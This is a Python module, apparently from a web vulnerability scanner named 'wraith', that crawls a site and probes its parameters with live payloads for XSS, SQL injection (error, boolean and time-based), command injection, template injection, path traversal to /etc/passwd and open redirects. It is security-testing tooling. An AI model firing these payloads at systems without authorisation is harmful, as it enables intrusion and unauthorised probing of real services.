"""Web — active injection testing with two-step confirmation.

Crawls the target, collects injectable parameters (query strings + HTML forms)
and probes each with a battery of techniques. Every technique has a single,
explainable oracle, and every hit is *confirmed a second way* before it's
reported — so a finding is evidence, not a guess:

  * Reflected XSS         a marker with raw <, >, " reflects unencoded.
  * SQLi (error-based)    a single quote raises a DB error; a balanced quote
                          clears it — proving the quote was the cause.
  * SQLi (boolean blind)  a TRUE condition returns the normal page while a
                          FALSE one diverges, across two injection contexts.
  * SQLi (time blind)     a SLEEP/pg_sleep/WAITFOR payload delays the response;
                          confirmed by a *second*, longer sleep — the measured
                          delay must track the time we asked for.
  * Command injection     a `; sleep N` payload delays the response (same time-
                          correlation proof) — server-side command execution.
  * SSTI                  {{a*b}} comes back evaluated (the product, not the
                          expression), confirmed with a second random product.
  * Path traversal / LFI  ../../etc/passwd returns a `root:x:0:0:` signature
                          absent from the baseline.
  * Open redirect         a redirect-style param lands in the Location header.

Run with -v/--verbose to watch each payload, its oracle measurement and the
confirmation step live.
"""

from __future__ import annotations

import asyncio
import random
import re
import string
import time
from urllib.parse import urlencode, urlsplit

from wraith.core import web
from wraith.core.http import fetch
from wraith.core.models import Severity
from wraith.core.phase import Phase, register

# --------------------------------------------------------------- signatures
_SQL_ERRORS = re.compile(
    r"(you have an error in your sql syntax|warning: mysqli?_|mysql_fetch|"
    r"valid mysql result|MySqlException|com\.mysql\.jdbc|"
    r"ORA-\d{5}|quoted string not properly terminated|"
    r"PostgreSQL.*ERROR|pg_query\(\)|syntax error at or near|"
    r"org\.postgresql\.util\.PSQLException|Npgsql\.|psycopg2\.|"
    r"SQLite3?::|sqlite3.OperationalError|"
    r"Microsoft OLE DB Provider|Unclosed quotation mark|SQLSTATE\[|"
    r"Incorrect syntax near|Conversion failed when converting|"
    r"System\.Data\.SqlClient\.SqlException|System\.Data\.OleDb|"
    r"Microsoft SQL (?:Server|Native)|\[SQL Server\]|ODBC SQL Server Driver|"
    r"SQLServerException|com\.microsoft\.sqlserver|"
    r"java\.sql\.SQLException|org\.hibernate)",
    re.I,
)
_PASSWD = re.compile(r"root:.*?:0:0:")                       # /etc/passwd first line
_WININI = re.compile(r"\[(?:fonts|extensions|mci|files)\]", re.I)  # windows win.ini sections

REDIRECT_PARAMS = {
    "url", "next", "redirect", "redirect_url", "redirecturl", "return", "returnurl",
    "return_url", "dest", "destination", "continue", "r", "u", "go", "to", "target",
    "link", "out", "view", "image_url",
}

# --------------------------------------------------------------- payloads
# Time-based. {s} = seconds to sleep; the leading 1'/1 closes a likely string
# or numeric context before the injected delay.
_SQLI_TIME = [
    ("sqli/MySQL",      "1' AND SLEEP({s})-- -"),
    ("sqli/MySQL-num",  "1 AND SLEEP({s})-- -"),
    ("sqli/PostgreSQL", "1';SELECT pg_sleep({s})-- -"),
    ("sqli/MSSQL",      "1';WAITFOR DELAY '0:0:{s}'-- -"),
]
_CMDI_TIME = [
    ("cmdi/shell-;",   "1; sleep {s} "),
    ("cmdi/shell-|",   "1| sleep {s} "),
    ("cmdi/subshell",  "1$(sleep {s})"),
    ("cmdi/backtick",  "1`sleep {s}`"),
]
# Boolean-blind: (TRUE, FALSE) pairs in three quoting contexts.
_SQLI_BOOL = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1",     "1 AND 1=2"),
    ('1" AND "1"="1', '1" AND "1"="2'),
]
# Parameters that are framework plumbing or anti-CSRF tokens, never the vuln —
# testing them just burns requests (ASP.NET __VIEWSTATE alone is huge).
_SKIP_PARAMS = {
    "__viewstate", "__viewstategenerator", "__eventvalidation", "__eventtarget",
    "__eventargument", "__viewstateencrypted", "__requestverificationtoken",
    "csrfmiddlewaretoken", "authenticity_token", "csrf_token", "csrftoken",
    "_csrf", "__csrf", "_token",
}


def _skip_param(name: str) -> bool:
    n = (name or "").lower()
    return n in _SKIP_PARAMS or n.startswith("__")


# Path traversal / LFI: (payload, label). All checked against the signatures.
_LFI_PAYLOADS = [
    ("../../../../../../../../etc/passwd",          "unix /etc/passwd"),
    ("....//....//....//....//....//etc/passwd",     "unix (dot-dot filter bypass)"),
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",  "unix (url-encoded)"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",     "windows win.ini"),
]


# ------------------------------------------------------- oracles (pure, tested)
def looks_like_sql_error(text: str) -> bool:
    return bool(_SQL_ERRORS.search(text or ""))


def sqli_quote_break(base: str, broken: str, restores, diff: float = 0.9,
                     restore: float = 0.95) -> bool:
    """SQLi without an error string: an odd quote clearly changes the response
    (often a blank/short page when the app swallows the DB exception) while a
    syntactically-valid continuation restores the original. `restores` are the
    bodies of valid follow-ups (`1''`, `1 AND 1=1`, `1-- -`) covering string and
    numeric contexts — any one restoring proves the quote broke SQL, not just
    that the param dislikes odd input. The diff check keeps reflective params
    (which barely change) from firing."""
    import difflib

    def sim(a, b):
        return difflib.SequenceMatcher(None, (a or "")[:4000], (b or "")[:4000]).ratio()

    if not (base or "").strip():
        return False                       # no stable baseline to compare against
    if sim(broken, base) >= diff:
        return False                       # the quote didn't break anything
    return any(sim(r, base) >= restore for r in restores)


def lfi_signature(text: str) -> str | None:
    """Name of the system file leaked in the response, or None."""
    if _PASSWD.search(text or ""):
        return "/etc/passwd"
    if _WININI.search(text or ""):
        return "windows/win.ini"
    return None


def ssti_payloads(a: int, b: int) -> list[tuple[str, str]]:
    """Render `a*b` in several template syntaxes. The engine that evaluates it
    returns the product; an engine that merely reflects echoes the expression."""
    e = f"{a}*{b}"
    return [
        ("Jinja2/Twig",      "{{%s}}" % e),
        ("Smarty/FreeMarker", "${%s}" % e),
        ("ERB",              "<%%= %s %%>" % e),
        ("Razor/Thymeleaf",  "#{%s}" % e),
    ]


def ssti_evaluated(text: str, product: int, expr: str) -> bool:
    """The product is present and the raw expression is gone -> it was evaluated."""
    text = text or ""
    return str(product) in text and expr not in text


def boolean_blind_hit(sim_true: float, sim_false: float) -> bool:
    """TRUE keeps the page (~ the normal one); FALSE breaks clearly away."""
    return sim_true >= 0.95 and sim_false <= 0.90


def timing_hit(base_t: float, elapsed: float, slept: float, frac: float = 0.6) -> bool:
    """The response took at least a good fraction of the sleep longer than normal."""
    return elapsed - base_t >= slept * frac


def timing_confirms(base_t: float, e1: float, s1: float, e2: float, s2: float) -> bool:
    """Both probes delayed AND the longer sleep delayed proportionally more —
    the response time tracks the injected sleep, ruling out random network lag."""
    return (timing_hit(base_t, e1, s1) and timing_hit(base_t, e2, s2)
            and (e2 - base_t) > (e1 - base_t) + 0.5 * (s2 - s1))


def timing_too_noisy(samples, max_spread: float = 2.0, max_slow: float = 4.0) -> bool:
    """A target whose benign response time swings wildly (or is just slow) can't
    be timed reliably — an injected sleep is indistinguishable from random lag,
    so time-based tests there only invent false positives."""
    if not samples:
        return True
    return (max(samples) - min(samples)) > max_spread or max(samples) > max_slow


@register
class InjectionPhase(Phase):
    name = "injection"
    requires = frozenset({"http-probe"})
    description = "XSS, SQLi (error/boolean/time), command injection, SSTI, LFI, open redirect."

    MAX_PAGES = 25
    MAX_POINTS = 60
    POINT_CONCURRENCY = 16  # parameters tested in parallel (overlaps remote latency)
    REQ_TIMEOUT = 6.0       # per-probe timeout — a stalled request fails fast, not the queue
    TIMING_POINTS = 10      # time-based probes are slow; cap how many points get them
    SLEEP_FAST = 3          # initial time-based probe
    SLEEP_CONFIRM = 6       # confirmation sleep — must delay proportionally more

    async def run(self, ws, console) -> None:
        self._console = console          # so _send can log HTTP at -v 2/3
        for base in self._bases(ws):
            host = urlsplit(base).netloc
            seeds = [base + "/"] + [e.url for e in ws.endpoints if e.url.startswith(base)]
            console.trace(f"crawling {base} for injectable parameters (up to {self.MAX_PAGES} pages)…",
                          level=1)
            pages = await web.crawl(
                seeds, host, fetch, self.MAX_PAGES, timeout=self.REQ_TIMEOUT,
                on_fetch=lambda u, n, t: console.trace(f"crawl [{n}/{t}] → GET {u}", level=2),
            )
            console.trace(f"crawl done: {len(pages)} page(s)", level=1)

            points, seen = [], set()
            for url, resp in pages.items():
                for pt in web.build_points(url, resp.text):
                    if _skip_param(pt.param):
                        continue          # framework / anti-CSRF plumbing, never the vuln
                    key = (pt.method, pt.action, pt.param, pt.location)
                    if key not in seen:
                        seen.add(key)
                        points.append(pt)
            points = points[: self.MAX_POINTS]
            if not points:
                console.warn(f"{base}: no injectable parameters found")
                continue

            console.info(f"{base}: testing {len(points)} parameter(s)")
            total = len(points)
            sqli_flagged: set = set()

            # Pass 1 — the cheap tests, run concurrently so request latency
            # overlaps. Sequential against a remote target is painfully slow.
            sem = asyncio.Semaphore(self.POINT_CONCURRENCY)
            counter = [0]

            async def cheap(pt):
                async with sem:
                    counter[0] += 1
                    console.trace(f"[{counter[0]}/{total}] {pt.method} {pt.action} [{pt.param}]", level=1)
                    hit = await self._test_sqli_error(ws, console, pt)
                    if not hit:            # already proven in-band — no need to also blind-test
                        hit = await self._test_sqli_boolean(ws, console, pt)
                    await self._test_ssti(ws, console, pt)
                    await self._test_lfi(ws, console, pt)
                    await self._test_xss(ws, console, pt)
                    if pt.param.lower() in REDIRECT_PARAMS and pt.location == "query":
                        await self._test_open_redirect(ws, console, pt)
                    if hit:
                        sqli_flagged.add(id(pt))

            await asyncio.gather(*(cheap(pt) for pt in points))

            # Pass 2 — time-based, sequential on a bounded subset so the timing
            # measurement isn't muddied by other requests running in parallel.
            # Skipped entirely on a high-jitter target: timing oracles can't tell
            # an injected sleep from random server lag there, so they'd be both
            # unreliable (false positives) and slow.
            timing = points[: self.TIMING_POINTS]
            if timing and await self._timing_reliable(console, timing[0]):
                console.trace(f"time-based pass on {len(timing)} parameter(s)", level=1)
                for pt in timing:
                    await self._test_time_based(ws, console, pt, skip_sql=(id(pt) in sqli_flagged))

    # ----------------------------------------------------------- transport
    _console = None

    async def _send(self, pt, value, timeout=None):
        timeout = timeout or self.REQ_TIMEOUT
        values = dict(pt.values)
        values[pt.param] = value
        if self._console is not None:
            self._console.trace(f"→ {pt.method} {pt.action}  [{pt.param}={value!r}]", level=2)
        if pt.location == "query":
            r = await fetch(f"{pt.action}?{urlencode(values)}", method="GET",
                            allow_redirects=False, timeout=timeout)
        else:
            r = await fetch(pt.action, method="POST", data=values,
                            allow_redirects=False, timeout=timeout)
        if self._console is not None and r is not None:
            self._console.trace(f"← {r.status}  {len(r.text)} bytes", level=3)
        return r

    async def _timed_send(self, pt, value, timeout):
        t0 = time.monotonic()
        r = await self._send(pt, value, timeout=timeout)
        return r, time.monotonic() - t0

    # ------------------------------------------------------------------ XSS
    async def _test_xss(self, ws, console, pt) -> bool:
        probe = "wx" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
        payload = f'{probe}"><svg/onload=alert(1)>'
        r = await self._send(pt, payload)
        hit = bool(r and payload in r.text)
        console.trace(f"xss        marker reflected raw={hit}")
        if hit:
            self._report(ws, console, "Reflected XSS", Severity.HIGH, pt, payload,
                         "Input is reflected without output encoding, allowing script injection.")
        return hit

    # --------------------------------------------------- SQLi in-band (quote)
    async def _test_sqli_error(self, ws, console, pt) -> bool:
        # One probe set, two oracles: a quote that errors (string leak) and a
        # quote that *breaks the response* (app swallows the error, returns blank).
        base = await self._send(pt, "1")
        broken = await self._send(pt, "1'")
        if not (base and broken):
            return False
        if looks_like_sql_error(base.text):
            return False                   # baseline already errors — can't tell
        broke = self._similar(broken.text, base.text) < 0.9
        console.trace(f"sqli/quote broken_err={looks_like_sql_error(broken.text)} "
                      f"sim(broken,base)={self._similar(broken.text, base.text):.2f} broke={broke}", level=2)

        # (a) error-based: a single quote raises a DB error a balanced one clears.
        if looks_like_sql_error(broken.text):
            balanced = await self._send(pt, "1''")
            if balanced and not looks_like_sql_error(balanced.text):
                self._report(ws, console, "SQL Injection (error-based)", Severity.HIGH, pt, "1'",
                             "A single quote raised a database error that a balanced quote clears — "
                             "the query is built from unsanitised input.")
                return True

        # (b) breakage-based: the odd quote breaks the response; a valid SQL
        #     continuation restores it — SQLi even when no error text leaks.
        if broke:
            restores = []
            for payload in ("1''", "1 AND 1=1", "1-- -"):   # string + numeric contexts
                r = await self._send(pt, payload)
                restores.append(r.text if r else "")
                if self._similar(restores[-1], base.text) >= 0.95:
                    break                  # one restore is enough
            if sqli_quote_break(base.text, broken.text, restores):
                console.trace("sqli/quote broke and a valid continuation restored — CONFIRMED", level=2)
                self._report(ws, console, "SQL Injection (blind — broken response)", Severity.HIGH, pt, "1'",
                             "A single quote breaks the response while a valid SQL continuation "
                             "restores it: the input alters SQL syntax, but the error is suppressed.")
                return True
        return False

    # ----------------------------------------------------- SQLi boolean-blind
    async def _test_sqli_boolean(self, ws, console, pt) -> bool:
        benign = await self._send(pt, pt.values.get(pt.param) or "1")
        if benign is None or not (200 <= benign.status < 300):
            return False
        # Try every quoting context (string, numeric, double-quote) as a probe —
        # the right one for the query matters (a numeric `1' AND ...` just breaks
        # a numeric column and looks like nothing).
        for true_v, false_v in _SQLI_BOOL:
            rt = await self._send(pt, true_v)
            rf = await self._send(pt, false_v)
            if not (rt and rf):
                continue
            sim_t = self._similar(rt.text, benign.text)
            sim_f = self._similar(rf.text, benign.text)
            console.trace(f"sqli/bool [{true_v!r}] true~normal={sim_t:.2f} false~normal={sim_f:.2f}", level=2)
            if not boolean_blind_hit(sim_t, sim_f):
                continue
            # Confirm the same divergence reproduces (guards a one-off content blip).
            ct = await self._send(pt, true_v)
            cf = await self._send(pt, false_v)
            if (ct and cf and boolean_blind_hit(self._similar(ct.text, benign.text),
                                                self._similar(cf.text, benign.text))):
                console.trace("confirm sqli/bool reproduced — CONFIRMED", level=2)
                self._report(ws, console, "SQL Injection (boolean blind)", Severity.HIGH, pt,
                             f"{true_v}  /  {false_v}",
                             "A TRUE condition returns the normal page while a FALSE one diverges "
                             "(reproduced) — the query's logic reacts to injected input.")
                return True
            console.trace("confirm sqli/bool did not reproduce — discarded", level=2)
        return False

    # ------------------------------------------------------------ time-based
    async def _test_time_based(self, ws, console, pt, skip_sql=False) -> bool:
        base_t = await self._baseline_time(pt)
        console.trace(f"timing baseline {base_t:.2f}s")
        families = ([] if skip_sql else list(_SQLI_TIME)) + list(_CMDI_TIME)

        # Fire the whole family at once with a short sleep, then confirm the one
        # that bites — keeps the slow part to ~one sleep of wall-time per param.
        probes = await asyncio.gather(*[
            self._timed_send(pt, tmpl.format(s=self.SLEEP_FAST), timeout=self.SLEEP_FAST + 8)
            for _, tmpl in families
        ])
        candidate = None
        for (label, tmpl), (r, dt) in zip(families, probes):
            hit = r is not None and timing_hit(base_t, dt, self.SLEEP_FAST)
            console.trace(f"{label:<16} sleep({self.SLEEP_FAST}) → {dt:.2f}s  {'HIT' if hit else '·'}")
            if hit and candidate is None:
                candidate = (label, tmpl, dt)
        if candidate is None:
            return False

        label, tmpl, dt1 = candidate
        r2, dt2 = await self._timed_send(pt, tmpl.format(s=self.SLEEP_CONFIRM),
                                         timeout=self.SLEEP_CONFIRM + 8)
        ok = r2 is not None and timing_confirms(base_t, dt1, self.SLEEP_FAST, dt2, self.SLEEP_CONFIRM)
        console.trace(f"confirm {label} sleep({self.SLEEP_CONFIRM}) → {dt2:.2f}s  "
                      f"{'CONFIRMED' if ok else 'not correlated — discarded'}")
        if not ok:
            return False

        is_sql = label.startswith("sqli")
        kind = "SQL Injection (time-based blind)" if is_sql else "Command Injection"
        sev = Severity.HIGH if is_sql else Severity.CRITICAL
        proof = (f"baseline {base_t:.2f}s; sleep({self.SLEEP_FAST})→{dt1:.2f}s; "
                 f"sleep({self.SLEEP_CONFIRM})→{dt2:.2f}s — delay tracks the injected sleep")
        self._report(ws, console, kind, sev, pt, tmpl.format(s=self.SLEEP_FAST),
                     f"The response time scales with an injected sleep, proving server-side "
                     f"{'SQL' if is_sql else 'OS command'} execution. {proof}")
        return True

    async def _baseline_time(self, pt) -> float:
        benign = pt.values.get(pt.param) or "1"
        samples = []
        for _ in range(2):
            _, dt = await self._timed_send(pt, benign, timeout=10)
            samples.append(dt)
        return min(samples)  # min is the least noisy estimate of "normal"

    async def _timing_reliable(self, console, pt) -> bool:
        """Sample the target's benign latency; if it swings too much, timing
        oracles can't be trusted here, so skip the whole time-based pass."""
        benign = pt.values.get(pt.param) or "1"
        samples = []
        for _ in range(4):
            _, dt = await self._timed_send(pt, benign, timeout=self.REQ_TIMEOUT)
            samples.append(dt)
        noisy = timing_too_noisy(samples)
        console.trace(f"timing jitter min={min(samples):.2f}s max={max(samples):.2f}s "
                      f"spread={max(samples) - min(samples):.2f}s → {'too noisy' if noisy else 'ok'}",
                      level=1)
        if noisy:
            console.warn("target latency too noisy for reliable time-based tests — skipping them")
        return not noisy

    # ------------------------------------------------------------------ SSTI
    async def _test_ssti(self, ws, console, pt) -> bool:
        a, b = random.randint(41, 99), random.randint(41, 99)
        expr, product = f"{a}*{b}", a * b
        # Cheap pre-check: one polyglot covering the common syntaxes. The product
        # shows up only if *some* engine evaluated it (a random 4-digit product
        # won't collide by chance), so non-vulnerable params cost a single
        # request instead of one per template.
        poly = "${%s}${{%s}}#{%s}{{%s}}<%%=%s%%>" % (expr, expr, expr, expr, expr)
        pre = await self._send(pt, poly)
        if pre is None or str(product) not in pre.text:
            console.trace(f"ssti pre-check {expr} → no eval", level=2)
            return False
        # Something evaluated — find which engine and confirm with a fresh product.
        for engine, payload in ssti_payloads(a, b):
            r = await self._send(pt, payload)
            if r is None or not ssti_evaluated(r.text, product, expr):
                continue
            c, d = random.randint(41, 99), random.randint(41, 99)
            r2 = await self._send(pt, payload.replace(expr, f"{c}*{d}"))
            ok = r2 is not None and ssti_evaluated(r2.text, c * d, f"{c}*{d}")
            console.trace(f"ssti/{engine} eval={product} confirm={'CONFIRMED' if ok else 'discarded'}", level=2)
            if ok:
                self._report(ws, console, "Server-Side Template Injection", Severity.HIGH, pt, payload,
                             f"A template expression was evaluated server-side ({engine}: "
                             f"sent {expr}, got {product}) — frequently a path to RCE.")
                return True
        return False

    # ------------------------------------------------------------------- LFI
    async def _test_lfi(self, ws, console, pt) -> bool:
        baseline = await self._send(pt, pt.values.get(pt.param) or "x")
        base_sig = lfi_signature(baseline.text) if baseline else None
        for payload, label in _LFI_PAYLOADS:
            r = await self._send(pt, payload)
            if r is None:
                continue
            sig = lfi_signature(r.text)
            hit = sig is not None and sig != base_sig
            console.trace(f"lfi/{label:<28} {'READ ' + sig if hit else 'no'}")
            if not hit:
                continue
            # Confirm it reads again — a one-off match could be noise.
            r2 = await self._send(pt, payload)
            if r2 and lfi_signature(r2.text) == sig:
                console.trace(f"confirm lfi {sig} read twice CONFIRMED")
                self._report(ws, console, "Path Traversal / Local File Inclusion", Severity.HIGH,
                             pt, payload,
                             f"A traversal payload returned a {sig} signature absent from the "
                             "baseline — the parameter reads arbitrary files.")
                return True
        return False

    # -------------------------------------------------------- open redirect
    async def _test_open_redirect(self, ws, console, pt) -> bool:
        r = await self._send(pt, "https://wraith.example/")
        if r is None:
            return False
        location = r.headers.get("location", "")
        hit = r.status in (301, 302, 303, 307, 308) and "wraith.example" in location
        console.trace(f"open-redirect status={r.status} location={location!r} hit={hit}")
        if hit:
            self._report(ws, console, "Open Redirect", Severity.MEDIUM, pt, "https://wraith.example/",
                         "The redirect target is taken from user input without validation.")
        return hit

    # --------------------------------------------------------------- report
    def _report(self, ws, console, title, sev, pt, payload, desc) -> None:
        where = f"{pt.method} {pt.action} [{pt.param}]"
        console.finding(sev.label, f"{title}  {where}")
        ws.add_finding(title=f"{title} in '{pt.param}'", severity=sev, phase=self.name,
                       target=pt.action, evidence=f"{where} payload={payload!r}", description=desc)

    # -------------------------------------------------------------- helpers
    @staticmethod
    def _similar(a, b) -> float:
        import difflib
        return difflib.SequenceMatcher(None, (a or "")[:4000], (b or "")[:4000]).ratio()

    @staticmethod
    def _bases(ws) -> list:
        seen, out = set(), []
        for e in ws.endpoints:
            p = urlsplit(e.url)
            base = f"{p.scheme}://{p.netloc}"
            if base not in seen:
                seen.add(base)
                out.append(base)
        return out
